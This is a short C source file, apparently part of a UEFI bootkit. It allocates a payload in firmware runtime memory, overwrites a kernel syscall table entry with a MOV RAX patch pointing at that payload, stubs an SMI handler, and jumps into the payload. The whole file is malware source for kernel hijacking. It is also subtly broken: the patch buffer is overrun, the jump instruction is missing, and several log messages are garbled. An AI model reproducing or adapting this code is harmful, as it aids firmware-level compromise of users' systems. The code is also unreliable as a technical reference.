#include "SyscallBridge.h"
#include "Logger.h"
#include "MemTools.h"
#include "EFIWrappers.h"

STATIC VOID* gRuntimePayload = NULL;
STATIC UINTN gPayloadSize = 0;

BOOLEAN InjectRuntimeHook(VOID* Payload, UINTN Size) {
    gRuntimePayload = EfiAlloc(Size);
    if (!gRuntimePayload) return FALSE;

    CopyMem(gRuntimePayload, Payload, Size);
    gPayloadSize = Size;
    LogInfo(L"Payload injected into runtime memory.");
    return TRUE;
}

BOOLEAN InstallSMIHandler(VOID* HandlerFunc) {
    LogInfo(L"SMI Handler installed (placeholder).");
    return TRUE;
}

BOOLEAN PrepareSyscallPatch(VOID* KernelBase, UINTN TableOffset) {
    // In KernelBase + TableOffset, inject jump into payload
    UINT8 Patch[] = { 0x48, 0xB8 }; // MOV RAX, ...
    VOID* Target = (UINT8*)KernelBase + TableOffset;

    CopyMem(Patch + 2, &gRuntimePayload, sizeof(VOID*));
    CopyMem(Target, Patch, sizeof(Patch) + sizeof(VOID*));

    LogInfo(L"Syscall patch .");
    return TRUE;
}

VOID BridgeToKernelMain() {
    if (!gRuntimePayload) {
        LogError(L"None payload load.");
        return;
    }

    VOID (*KernelMain)(VOID) = (VOID (*)(VOID))gRuntimePayload;
    KernelMain(); 
}

VOID WriteRuntimeData(VOID* Data, UINTN Size) {
    VOID* Dest = EfiAlloc(Size);
    if (!Dest) return;

    CopyMem(Dest, Data, Size);
    LogInfo(L"Data written in runtime environment.");
}
